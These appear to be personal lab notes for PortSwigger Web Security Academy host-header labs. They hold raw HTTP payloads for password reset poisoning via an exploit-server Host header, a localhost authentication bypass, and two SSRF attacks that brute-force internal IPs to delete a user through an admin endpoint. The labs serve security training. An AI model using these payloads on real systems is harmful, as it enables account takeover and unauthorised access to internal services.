### Basic password reset poisoning
**Payload**: 
```
Host: https://exploit-0a9a003203239a7c824d148b01f000c7.exploit-server.net
Origin: https://exploit-0a9a003203239a7c824d148b01f000c7.exploit-server.net
Referer: https://exploit-0a9a003203239a7c824d148b01f000c7.exploit-server.net/forgot-password
```
**Penjelasan** :
Basically when the user want to reset password, and the server take host header

### Host header authentication bypass
**Payload**:
change the `Host` header to `localhost` because admin page only can access by localhost

### Routing-based SSRF
**Payload**:
```http
POST /admin/delete HTTP/2
Host: 192.168.0.191
Cookie: session=GSIwyXXNJm0VP8c40IiuaDoWwklf8suf; _lab=46%7cMCwCFFzoHiPd5UavCSmmXwHoTIjOPoakAhQ8K%2fkplBEUaLhP50Lc2gEsb%2bT5ch2sWx8PgnFDXPETZK7%2fwlo%2btEvTtYjg%2b0VONi1Z%2fa%2bK4NhaEMDJMmQ7MWQ7IdPN51WSitRE3rlkixOr%2b4cmTyXfxxZbu8Z2Ws%2bRDIoPgRxacYOwf4M%3d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Length: 53

csrf=iBDSQHGvmt30jH4p0sdwBoAlUQEsUTbU&username=carlos
```

**Flow** :
Trying to change `Host` value to burpsuite collaborator -> response is from collaborator -> send to intruder -> change the path to `/admin` -> bruteforce the `Host` value with range 192.168.0.0/24 -> response is from internal server -> copy `csrf` value and put username that want to delete-> send as POST

### SSRF via flawed request parsing
**Payload**:
```http
POST http://0a150023030da8b480af949e005d00a0.web-security-academy.net/admin/delete HTTP/2
Host: 192.168.0.226
Cookie: session=EG9LmttwZBrn8i01W2yPpZPRAlYAN9sj; _lab=46%7cMCwCFHvig%2bEhKdXhp%2b2hg6idXxU5wCemAhQ%2bJGJdcKWM9sc3khiPhsoiWq2QMwUMhXQs%2fa9xDtXSs9v%2bDXn%2bL8HJXHeEizM%2bzraOrYCmxRmwOt6RDLXRNwsUpMrV1CJAQnCQsuZFUPRRQhqGX52YzSpjbgPj%2bSjByVqD1TvxiJ71xzQ%3d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Length: 53

csrf=A69SmT5BJ3yh9F0FkiiB14V7g3o4zZF1&username=carlos
```
**Flow** :
Trying to change `Host` value to burpsuite collaborator -> server send response `Forbidden` -> based on the reference you can do 'Host Overriding' -> add specific URI web-security on path -> response is from collaborator -> send to intruder -> change the path to `/admin` -> bruteforce the `Host` value with range 192.168.0.0/24 -> response is from internal server -> copy `csrf` value and put username that want to delete-> send as POST

**Reference**:
https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#Host%Overriding